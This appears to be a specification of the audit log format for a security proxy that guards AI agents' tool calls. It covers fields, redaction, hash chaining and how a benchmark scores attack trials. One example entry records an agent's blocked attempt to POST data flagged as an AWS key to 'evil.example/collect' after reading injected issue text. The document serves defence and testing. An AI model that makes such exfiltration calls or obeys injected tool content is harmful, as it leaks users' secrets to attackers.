# audit_log_schema.md — Audit Log Specification (v1)

**Status:** v0 draft · Contract for `mcpsec_core.audit`, `mcpsec-replay`, and the benchmark runner.

Format: JSON Lines (one JSON object per line), UTF-8, append-only. Timestamps are RFC 3339 UTC with millisecond precision.

Every line carries `schema_version` and `event_type`. Consumers must ignore unknown fields (forward compatible) and reject unknown `schema_version`.

---

## 1. Event types

| `event_type` | Emitted when |
|--------------|--------------|
| `session_start` | An agent connects. |
| `session_end` | An agent disconnects or the proxy shuts down. |
| `policy_loaded` | Proxy starts (records policy hash). |
| `tool_call` | Every tool call, allowed or not. |
| `approval` | A pending call is approved, denied, or times out; labels cleared. |
| `pin_event` | A tool/server is pinned, changes, or is re-approved. |

## 2. Common fields (all events)

| Field | Type | Notes |
|-------|------|-------|
| `schema_version` | int | `1` |
| `event_type` | string | See §1. |
| `timestamp` | string | RFC 3339 UTC, ms. |
| `seq` | int | Monotonic per log file, starting at 1. Gaps indicate loss. |
| `session_id` | string | Proxy-assigned (UUIDv4). Absent only for `policy_loaded`. |
| `prev_hash` | string | Optional hash chain: SHA-256 of the previous line's bytes. Enabled by `--tamper-evident`. |

## 3. `tool_call`

| Field | Type | Notes |
|-------|------|-------|
| `call_id` | string | Unique per call (UUIDv4). Links to `approval` events. |
| `agent_id` | string | |
| `server` | string | Server name from proxy config. |
| `tool` | string | Tool name; `<server>.<tool>` is the policy identifier. |
| `capabilities` | list[string] | Resolved from policy; `[]` if unlisted. |
| `args` | object \| string | Per `redaction.log_args`: full, redacted, or `{"sha256": ...}`. |
| `decision` | enum | `allow` \| `deny` \| `require_approval` |
| `effective_decision` | enum | What actually happened: `forwarded` \| `blocked` \| `held`. Differs from `decision` in `audit` mode (`deny` + `forwarded`). |
| `decision_layer` | enum | `pinning` \| `policy` \| `flow` \| `approval` \| `none` (which layer decided). |
| `decision_reason` | string | Human-readable, e.g. `path not in allowlist`. |
| `rule_id` | string \| null | Flow rule `id` when `decision_layer` is `flow`. |
| `taint_before` | list[string] | Session labels before this call. |
| `taint_after` | list[string] | Labels after response processing. |
| `pin_status` | enum | `pinned` \| `unpinned` \| `changed` |
| `flags` | list[string] | Detector output, e.g. `secret_in_args:aws_key`, `injection_marker`. |
| `risk_score` | number \| null | 0.0–1.0 from detectors; `null` if detectors off. Informational only. |
| `response_summary` | object \| null | `{status: ok|error, bytes: int, content_type?: string}`. Never raw content. |
| `latency_ms` | object | `{proxy: number, upstream: number|null}`. `proxy` = overhead of checks only. |
| `error` | string \| null | Upstream or proxy error text (redacted). |

### Example: allowed call that taints the session
```json
{"schema_version":1,"event_type":"tool_call","timestamp":"2026-10-14T09:12:03.412Z","seq":42,"session_id":"7c1d…","call_id":"a91f…","agent_id":"dev-agent","server":"github","tool":"get_issue","capabilities":["network_read"],"args":{"repo":"acme/app","number":17},"decision":"allow","effective_decision":"forwarded","decision_layer":"none","decision_reason":"allowed by policy","rule_id":null,"taint_before":[],"taint_after":["untrusted_content"],"pin_status":"pinned","flags":["injection_marker"],"risk_score":0.6,"response_summary":{"status":"ok","bytes":1843},"latency_ms":{"proxy":2.1,"upstream":212.4},"error":null}
```

### Example: exfiltration attempt blocked by a flow rule
```json
{"schema_version":1,"event_type":"tool_call","timestamp":"2026-10-14T09:12:09.871Z","seq":43,"session_id":"7c1d…","call_id":"b3e0…","agent_id":"dev-agent","server":"http","tool":"post","capabilities":["egress"],"args":{"url":"https://evil.example/collect","body":"[REDACTED]"},"decision":"deny","effective_decision":"blocked","decision_layer":"flow","decision_reason":"session has untrusted_content; egress denied","rule_id":"no-egress-after-untrusted","taint_before":["untrusted_content"],"taint_after":["untrusted_content"],"pin_status":"pinned","flags":["secret_in_args:aws_key"],"risk_score":0.9,"response_summary":null,"latency_ms":{"proxy":1.4,"upstream":null},"error":null}
```

## 4. `approval`

| Field | Type | Notes |
|-------|------|-------|
| `call_id` | string \| null | The held call, if the approval concerns one. |
| `action` | enum | `approved` \| `denied` \| `timeout` \| `clear_taint` |
| `cleared_labels` | list[string] | Labels removed (must be in `approval.allow_clear`). |
| `approver` | string | OS username or `"cli"`. |
| `taint_before` / `taint_after` | list[string] | Session labels around the approval. |
| `note` | string \| null | Free text from the approver. |

```json
{"schema_version":1,"event_type":"approval","timestamp":"2026-10-14T09:14:40.005Z","seq":44,"session_id":"7c1d…","call_id":"b3e0…","action":"clear_taint","cleared_labels":["untrusted_content"],"approver":"utkarsh","taint_before":["untrusted_content"],"taint_after":[],"note":"reviewed issue text"}
```

## 5. `pin_event`

| Field | Type | Notes |
|-------|------|-------|
| `server` | string | |
| `tool` | string \| null | `null` for server-level events. |
| `action` | enum | `first_seen` \| `changed` \| `approved` \| `list_changed_received` |
| `old_hash` / `new_hash` | string \| null | SHA-256 hex. |
| `diff_summary` | string \| null | e.g. `description changed (+214 chars)`. |
| `mode` | enum | `audit` \| `strict` |
| `effective_decision` | enum | `logged` \| `blocked_until_approved` \| `accepted` |

## 6. Session & policy events

- `session_start`: `agent_id`, `client_info` (name/version if provided), `policy_hash` (SHA-256 of the loaded policy file), `mode`.
- `session_end`: `reason` (`disconnect` | `shutdown` | `error`), `final_taint`, `call_count`, `deny_count`.
- `policy_loaded`: `policy_path`, `policy_hash`, `warnings` (list from startup validation).

## 7. Redaction rules

- Governed by policy `redaction` (see `policy_schema.md` §9).
- `log_args: full` — raw args (dev/benchmark use only).
- `log_args: redacted` — values matching `redaction.patterns` or fields in `never_log_fields` become `"[REDACTED]"`; structure preserved.
- `log_args: hash_only` — `args` = `{"sha256": "<hex of canonical JSON>"}`.
- Responses are **never** logged verbatim; only `response_summary`.
- Redaction affects the log only, not forwarded traffic.
- Benchmark runs use `full` args against synthetic secrets only, and results files must not contain real credentials.

## 8. Integrity & operations

- Single writer task; entries flushed per line, `fsync` per line in `strict` pinning mode.
- Rotation: by size (default 50 MB), files named `audit-YYYYMMDD-HHMMSS.jsonl`; `seq` restarts per file, and the first entry of a rotated file records the previous file's last hash when `prev_hash` is enabled.
- `--tamper-evident` adds the hash chain. This detects truncation/edit of a file after the fact; it is **not** protection against a compromised host.

## 9. Replay & benchmark consumption

- `mcpsec-replay` reconstructs per-session timelines from `session_id` + `seq`, and can filter by `agent_id`, `tool`, `decision`, `decision_layer`, `rule_id`, `flags`.
- Benchmark runner derives, per attack trial: whether any `egress`/`exec` call was `forwarded` after taint (attack success), any `blocked` call in a benign trial (false positive), and `latency_ms.proxy` distributions (overhead).
- The log is the **ground truth** for benchmark scoring, so schema changes after benchmark runs begin require a version bump.